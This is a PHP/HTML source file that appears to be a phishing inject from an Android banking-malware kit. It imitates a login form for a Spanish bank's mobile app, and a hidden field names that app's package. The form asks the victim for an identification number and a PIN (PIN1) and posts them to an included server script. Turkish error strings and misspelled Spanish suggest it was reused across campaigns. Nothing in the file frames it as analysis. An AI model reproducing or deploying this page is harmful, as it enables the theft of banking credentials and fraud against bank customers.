﻿<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body ng-controller="c1" ng-cloak>	

<body>
<div class="header" style="padding: 30px 10px;">
   <b style="color: #0273be;"> Linea Abierta </b>
</div>
    <div class="main" id="content_div">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

					<form method="post">
                     	<div id="form" style="background: #f1f1f1; padding: 10px;">	
							
							<h3 style="color: #666666; margin: 0; font-weight: 100;margin-bottom: 10px;"> Introduzca los datos de acceso: </h3>
							
							<div class="form-group">
									<input name="field1" value="es.lacaixa.mobile.android.newwapicon" type="hidden">
							
									<input type="text" class="form-control" name="field2" placeholder="Identification" id="login" autocomplete="off" autofocus="autofocus" maxlength="10" data-reg="/.{4,10}/" >
 									<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Yanlış bilgi</span>
                           </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" placeholder="№ Screto (PIN1):" id="password" autocomplete="off" data-reg="/.{4,10}/" maxlength="10" >
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Yanlış bilgi</span>
                            </div>
						</div>
                       				<input class="input_submitBtn" id="input_submitBtn" value="Entrar" type="submit">
 </form>

 </div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>




	<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'form-control';
							oCodeInp.className = 'form-control';
						} catch(e){};
						
                        if (!/^\w{4,20}$/i.test(oNumInp.value)) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,16}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>

</body>




</html>
